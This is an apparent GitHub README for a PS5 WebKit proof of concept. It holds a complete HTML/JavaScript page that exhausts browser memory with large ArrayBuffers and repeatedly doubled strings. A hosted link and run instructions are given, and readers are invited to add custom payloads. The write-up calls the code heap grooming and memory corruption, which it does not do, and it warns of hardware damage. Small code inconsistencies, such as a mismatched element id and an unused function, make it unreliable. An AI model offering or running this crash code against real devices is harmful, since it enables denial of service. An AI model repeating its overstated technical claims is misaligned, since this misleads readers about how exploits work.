# Overflow WebKit Memory Leak PoC

## **DISCLAIMER**

**THIS REPOSITORY IS FOR TESTING PURPOSES ONLY!**  
A significant portion of this code might be incomplete or ineffective. If this vulnerability is ever fully exploited, it will likely be done by someone with far more expertise. I do not claim to be an expert in exploit development!

This PoC is for **educational purposes only**. The author assumes no responsibility for any misuse of this code.

## Link

Follow this link for the exploit: [Overflow WebKit Memory Leak PoC](https://seregonwar.github.io/Overflow/)

## Description

This Proof of Concept (PoC) demonstrates a WebKit memory exhaustion exploit under development. The exploit aims to exhaust memory resources by creating large amounts of objects and deallocating selectively to induce memory corruption. The PoC is effective on some versions of PS5 firmware (up to version 9.60) but requires further development for full exploitation.

This JavaScript code handles memory manipulation through a combination of heap grooming and overflow techniques, aimed at triggering a memory leak or system crash.

## How It Works

### Key Steps:
1. **Heap Initialization**: Controlled memory allocations to prepare for exploit.
2. **Heap Grooming**: Strategic allocation and deallocation to create exploitable memory gaps.
3. **Memory Exhaustion**: Continuous memory allocation to deplete available resources.
4. **Payload Execution**: String concatenation and object creation to force memory corruption.
5. **Exploit Execution**: All steps executed in sequence to trigger memory exhaustion and cause a crash.

## Code

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Memory Leak</title>
    <style>
        body, html {
            height: 100%;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }
        button {
            font-size: 30px;
            padding: 15px 30px;
            border: none;
            background-color: #007BFF;
            color: white;
            cursor: pointer;
            border-radius: 10px;
            margin: 10px;
        }
        button:hover {
            background-color: #0056b3;
        }
        #divMsg {
            margin-top: 20px;
            font-size: 20px;
        }
    </style>
    <script>
        function log(message) {
            console.log(message);
            document.getElementById('msg').innerHTML += `<p>${message}</p>`;
        }

        function initializeHeap() {
            let buffers = [];
            for (let i = 0; i < 1024; i++) {
                buffers.push(new ArrayBuffer(250000));
            }
            return buffers;
        }

        function groomHeap() {
            let tempArray = [];
            for (let i = 0; i < 1024; i++) {
                let buffer = new ArrayBuffer(500);
                tempArray.push(buffer);
            }
            for (let i = 0; i < 756; i++) {
                tempArray[i] = null;
            }
            return tempArray;
        }

        function memExh() {
            let bufferArray = [];
            for (let i = 0; i < 1024; i++) {
                bufferArray.push(new ArrayBuffer(450000));
                if (bufferArray.length > 256) {
                    bufferArray = [];
                }
            }
        }

        function payload() {
            let largeString = "B".repeat(450000);
            let obj = {};
            let iterationCount = 0;
            while (iterationCount < 32) {
                largeString += largeString;
                if (largeString.length > 50000000) {
                    largeString = "B".repeat(450000);
                }
                memExh();
                iterationCount++;
            }
        }

        function performExploit() {
            let controlledBuffers = initializeHeap();
            let groomedHeap = groomHeap();
            memExh();
            payload();
        }

        function startExploitWithDelay() {
            setTimeout(() => {
                performExploit();
            }, 4770);
        }
    </script>
</head>
<body>
    <button onclick="performExploit()">Latest Iteration</button>
    <div id="msg"></div>
</body>
</html>
```

### Payload and Execution:

- **Step 1: Heap Initialization**: Creates 1024 `ArrayBuffer` objects of 250KB each.
- **Step 2: Heap Grooming**: Allocates and selectively deallocates memory blocks to introduce exploitable gaps in the heap.
- **Step 3: Memory Exhaustion**: Continuously allocates and deallocates memory buffers of 450KB each, exhausting system resources.
- **Step 4: Payload Execution**: The payload performs string concatenation, continuously creating large strings and exhausting available memory.

## Instructions

1. Execute the above code on an exploitable PS5 (firmware version up to 9.60). It may not work on PS4.
2. This is a PoC for **educational purposes only**. Do not use on critical devices or systems.
3. The PoC triggers a **heap memory exhaustion** vulnerability, causing the system to potentially crash or leak memory.
4. For more advanced use, custom payloads can be inserted in the `payload()` function.

## **WARNING**

Running this PoC involves serious risks, including:

1. **Device Bricking**: Incorrect execution could irreversibly brick the system.
2. **Data Loss**: Memory vulnerabilities can lead to data corruption or loss.
3. **Incompatibility**: May not work on all systems or firmware versions, leading to unexpected consequences.
4. **Hardware Damage**: Continuous memory exhaustion can damage hardware.

## Credit

Credits for the original structure go to [idebty](https://x.com/idebty), who discovered the vulnerability. The current implementation expands upon their work.

